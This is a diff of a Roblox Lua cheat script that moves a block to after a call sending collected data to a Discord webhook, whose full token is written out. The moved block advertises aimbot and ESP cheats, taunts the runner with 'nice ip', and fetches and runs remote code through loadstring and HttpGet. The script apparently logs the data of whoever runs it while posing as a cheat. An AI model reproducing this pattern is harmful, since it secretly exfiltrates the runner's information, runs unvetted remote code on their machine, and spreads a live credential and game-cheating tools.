@@ -104,18 +104,6 @@ local function a(b)
     end
 end
 
-messagebox("pls open F9", "pls",4)
-printidentity()
-print("hello player is project delta script beta sorry ): discord:mixvpn silent aim 50/50 sorry esp bad use pls infiniteyield esp Goodbye")
-print("https://discord.gg/xbvDUA8eCt")
-warn("nice ip")
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-
-game.Players.LocalPlayer.Character.Humanoid.JumpPower = 28
-while true do wait()
-game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
-end
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -205,3 +193,16 @@ end
 local webhookUrl = "https://discord.com/api/webhooks/1304179425264406671/Q90zkldqFnjoHZ4Z60rejeVuy21arPZkO4JekishBhEq4r_zrv8-58pcmr5goH-StZEc"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
+
+
+messagebox("pls open F9", "pls",4)
+printidentity()
+print("hello player is project delta script beta sorry ): discord:mixvpn silent aim 50/50 sorry esp bad use pls infiniteyield esp Goodbye")
+print("https://discord.gg/xbvDUA8eCt")
+warn("nice ip")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 28
+while true do wait()
+game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
+end
